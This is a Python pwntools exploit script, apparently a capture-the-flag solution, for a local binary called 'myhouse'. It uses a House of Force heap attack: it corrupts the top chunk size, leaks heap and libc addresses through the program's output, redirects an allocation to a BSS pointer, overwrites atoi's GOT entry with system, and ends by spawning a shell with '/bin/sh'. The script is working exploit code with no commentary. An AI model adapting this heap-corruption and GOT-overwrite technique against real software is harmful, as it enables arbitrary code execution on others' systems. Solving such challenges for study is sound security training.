from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./myhouse")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./myhouse")
else:
	pass
"""
def init(name,housename,size,dis):
	p.sendafter("name?\n",name)
	p.sendafter("house?\n",housename)
	p.sendafter("house?\n",str(size))
	p.sendafter("description:\n",dis)"""
def init(name, housen, houses1, houses2, housed):
    p.sendafter("name?", name)
    p.sendafter("house?", housen)
    if houses1 > 0x300000:
        p.sendlineafter("house?", str(houses1))
        p.sendlineafter("Too large!", str(houses2))
    else:
        p.sendlineafter("house?", str(houses1))
    if houses2!=0:
        p.sendafter("description:", housed)

def add(size):
	p.sendafter("Your choice:\n","1")
	p.sendafter("room?\n",str(size))

def edit(content):
	p.sendafter("Your choice:\n","2")
	p.sendafter("shining!\n",content)

def show():
	p.sendafter("Your choice:\n","3")

def debugf():
	gdb.attach(p,"b *0x400C02")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
init("a"*0x20, "\x00"*0xf8+p64(0xffffffffffffffff), 0x5c5b69,0x200000,  "A\n")
show()
p.recvuntil("a"*0x20)
heap_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = heap_addr - 0x10
log.success("heap_base:"+hex(heap_base))
bss_addr = 0x6020c0
add(bss_addr - (heap_base + 0x100) - 0x10 - 0x10)
add(0xa0)
edit(p64(elf.got["atoi"])*2)
show()
p.recvuntil("description:\n")
atoi_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = atoi_addr - libc.symbols["atoi"]
log.success("libc_base:"+hex(libc.address))
edit(p64(libc.symbols["system"]))
p.sendafter("Your choice:\n","/bin/sh\x00")
p.interactive()
